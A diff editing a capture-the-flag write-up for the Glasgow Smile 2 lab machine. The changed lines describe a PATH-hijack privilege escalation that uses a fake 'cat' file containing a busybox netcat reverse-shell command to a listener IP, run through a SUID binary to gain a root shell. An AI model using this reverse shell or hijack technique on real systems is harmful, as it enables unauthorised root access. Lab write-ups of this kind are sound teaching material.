@@ -811,7 +811,7 @@ __FRAME_END__
 \
 WE see that there is a line "cat ./batman"
 \
-So i create  binary with a reverse shell payload 
+So i create a binary to spoof the actual "cat" binary with a reverse shell payload 
 ```bash
 enom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ echo "busybox nc 192.168.0.105 4446 -e /bin/sh" > cat
 venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ chmod +x cat
@@ -821,7 +821,7 @@ venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ echo $PATH
 /tmp:/usr/bin:/bin
 ```
 \
-After this , if we run "./gothamwillburn4" , we get a reverse shell as root since , this is a SUID binary
+After this , if we run "./gothamwillburn4" , we get a reverse shell as root ,since this is a SUID binary
 
 ```bash
 root@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham# id
